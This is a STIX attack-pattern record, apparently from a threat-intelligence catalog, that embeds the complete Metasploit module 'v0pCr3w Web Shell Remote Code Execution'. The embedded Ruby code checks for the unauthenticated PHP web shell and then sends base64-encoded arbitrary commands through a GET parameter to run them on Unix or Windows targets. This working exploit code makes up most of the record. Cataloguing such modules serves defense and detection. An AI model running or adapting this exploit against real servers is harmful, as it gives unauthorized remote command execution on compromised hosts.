{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e5e68504-884e-4d5b-965f-9bf38cf06c2d",
    "created": "2024-08-14T17:09:06.95097Z",
    "modified": "2024-08-14T17:09:06.950974Z",
    "name": "v0pCr3w Web Shell Remote Code Execution",
    "description": " This module exploits a lack of authentication in the shell developed by v0pCr3w and is widely reused in automated RFI payloads. This module takes advantage of the shell's various methods to execute commands.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/v0pcr3w_exec.rb",
            "external_id": "v0pcr3w_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://defense.ballastsecurity.net/wiki/index.php/V0pCr3w_shell"
        },
        {
            "source_name": "reference",
            "url": "https://defense.ballastsecurity.net/decoding/index.php?hash=f6b534edf37c3cc0aa88997810daf9c0"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'v0pCr3w Web Shell Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a lack of authentication in the shell developed by v0pCr3w\n        and is widely reused in automated RFI payloads. This module takes advantage of the\n        shell's various methods to execute commands.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bwall <bwall[at]openbwall.com>',  # vuln discovery & msf module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '91841'],\n          [ 'URL', 'https://defense.ballastsecurity.net/wiki/index.php/V0pCr3w_shell' ],\n          [ 'URL', 'https://defense.ballastsecurity.net/decoding/index.php?hash=f6b534edf37c3cc0aa88997810daf9c0' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 2000,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd'\n            }\n        },\n      'Platform'       => %w{ unix win },\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['v0pCr3w / Unix', { 'Platform' => 'unix' } ],\n          ['v0pCr3w / Windows', { 'Platform' => 'win' } ]\n        ],\n      'DisclosureDate' => '2013-03-23',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, \"The path to the v0pCr3w shell\", \"/jos.php\"]),\n      ])\n  end\n\n  def check\n    shell = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path.to_s),\n      'vars_get' => {\n        'lol' => '1'\n      }\n    })\n    if (shell and shell.body =~ /v0pCr3w\\<br\\>/ and shell.body =~ /\\<br\\>nob0dyCr3w/)\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def http_send_command(cmd)\n    p = Rex::Text.encode_base64(cmd)\n    res = send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path.to_s),\n      'vars_get' => {\n        'osc' => p\n      }\n    })\n    if not (res and res.code == 200)\n      fail_with(Failure::Unknown, 'Failed to execute the command.')\n    end\n  end\n\n  def exploit\n    http_send_command(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-23",
    "x_mitre_platforms": [
        "%w{ unix win }"
    ]
}